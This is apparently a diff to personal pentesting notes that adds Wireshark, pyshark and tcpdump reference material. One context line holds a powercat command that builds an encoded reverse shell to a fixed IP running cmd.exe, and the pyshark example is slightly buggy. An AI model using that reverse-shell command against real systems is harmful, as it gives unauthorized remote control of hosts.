@@ -270,3 +270,73 @@ powercat -c 10.11.0.4 -p 443 -e cmd.exe -ge > encodedreverseshell.ps1
 
 # Wireshark
 
+![https://cdn.comparitech.com/wp-content/uploads/2019/06/Wireshark-Cheat-Sheet-1.jpg](assets.md/Wireshark-Cheat-Sheet-1.jpg)
+
+
+
+**Command Line Tools** - `tshark`, `termshark`
+
+**Python Library** - `pyshark`
+
+```python
+import pyshark
+
+pyshark.FileCapture('<file-name>')				# Open captured pcap files
+pyshark.LiveCapture('<file-name>')				# Capture At live
+sniff_continuously(packet_count=<count>)		# Object method
+
+<dictionary>
+
+
+-- example code
+import pyshark
+capture = pyshark.LiveCapture(interface='eth0')
+for packet in capture.sniff_continuously(packet_count=50):
+    myfile = open('pyshark1.txt','w')
+    myfile.write(str(packet))
+    try:
+        print('Source = ' + packet['ip'].src)
+        print('Destination = ' + packet['ip'].dst)
+    except:
+        pass
+print ('The end')
+exit()
+```
+
+------
+
+# Tcpdump
+
+**To capture packets read captured files.**
+
+```bash
+SYNOPSIS
+       tcpdump [ -AbdDefhHIJKlLnNOpqStuUvxX# ] [ -B buffer_size ]
+               [ -c count ] [ --count ] [ -C file_size ]
+               [ -E spi@ipaddr algo:secret,...  ]
+               [ -F file ] [ -G rotate_seconds ] [ -i interface ]
+               [ --immediate-mode ] [ -j tstamp_type ] [ -m module ]
+               [ -M secret ] [ --number ] [ --print ] [ -Q in|out|inout ]
+               [ -r file ] [ -s snaplen ] [ -T type ] [ --version ]
+               [ -V file ] [ -w file ] [ -W filecount ] [ -y datalinktype ]
+               [ -z postrotate-command ] [ -Z user ]
+               [ --time-stamp-precision=tstamp_precision ]
+               [ --micro ] [ --nano ]
+               [ expression ]
+```
+
+```bash
+OPTIONS 
+	
+	   -A Print each packet (minus its link level header) in ASCII.  
+       -C file_size Before writing a raw packet to a savefile.
+       -d Dump the compiled packet-matching code in a human readable form to standard output and stop. 
+       -e Print the link-level header on each dump line. 
+       -f Print `foreign' IPv4 addresses numerically rather than symbolically 
+       -F file Use file as input for the filter expression. 
+       -I --monitor-mode 
+       	  --immediate-mode 
+```
+
+------
+
